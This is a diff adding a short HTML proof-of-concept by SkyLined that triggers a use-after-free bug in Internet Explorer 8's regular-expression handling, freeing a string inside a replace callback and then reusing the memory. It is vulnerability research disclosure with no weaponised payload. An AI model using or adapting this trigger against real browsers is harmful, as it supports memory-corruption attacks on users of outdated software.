@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <script>
+    // This PoC attempts to exploit a use-after-free bug in Microsoft Internet
+    // Explorer 8.
+    // See http://blog.skylined.nl/20161116001.html for details.
+    var r=new RegExp("A|x|x|xx|xxxxxxxxxxxxxxxxxxxx+", "g");
+    "A".replace(r, function (){
+      // Force OLEAUT32 to free the string
+      for (var j = 0; j < 16; j++) new Array(0x1000).join("B");
+      // Reuse the freed memory
+      r.compile();
+    });
+    // This work by SkyLined is licensed under a Creative Commons
+    // Attribution-Non-Commercial 4.0 International License. 
+  </script>
+</html>
